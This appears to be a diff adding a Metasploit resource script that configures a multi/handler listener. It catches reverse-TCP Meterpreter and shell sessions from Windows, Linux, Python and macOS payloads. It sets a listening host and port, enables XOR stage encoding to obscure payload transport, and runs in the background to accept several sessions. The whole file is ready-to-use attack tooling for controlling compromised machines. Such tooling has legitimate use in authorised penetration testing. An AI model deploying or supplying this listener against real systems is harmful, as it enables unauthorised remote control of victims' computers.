@@ -1,0 +1,39 @@
+# ─────────────────────────────────────────────────────────────────────────────
+# multi_handler.rc — Metasploit Listener
+# Usage: msfconsole -r multi_handler.rc
+# Edit LHOST/LPORT/PAYLOAD before use
+# ─────────────────────────────────────────────────────────────────────────────
+
+use exploit/multi/handler
+
+# ── Common payloads (uncomment one) ──────────────────────────────────────────
+
+# Windows Meterpreter (staged)
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Windows Meterpreter (stageless)
+# set PAYLOAD windows/x64/meterpreter_reverse_tcp
+
+# Linux Meterpreter
+# set PAYLOAD linux/x64/meterpreter/reverse_tcp
+
+# Linux shell (simple)
+# set PAYLOAD linux/x64/shell_reverse_tcp
+
+# Python (cross-platform)
+# set PAYLOAD python/meterpreter/reverse_tcp
+
+# macOS
+# set PAYLOAD osx/x64/meterpreter/reverse_tcp
+
+# ── Network ───────────────────────────────────────────────────────────────────
+set LHOST 10.0.0.1
+set LPORT 4444
+
+# ── Options ───────────────────────────────────────────────────────────────────
+set ExitOnSession false      # keep listening after first session
+set EnableStageEncoding true # encrypt staged payload transport
+set StageEncoder x64/xor_dynamic
+
+# Run in background, handle multiple sessions
+run -j
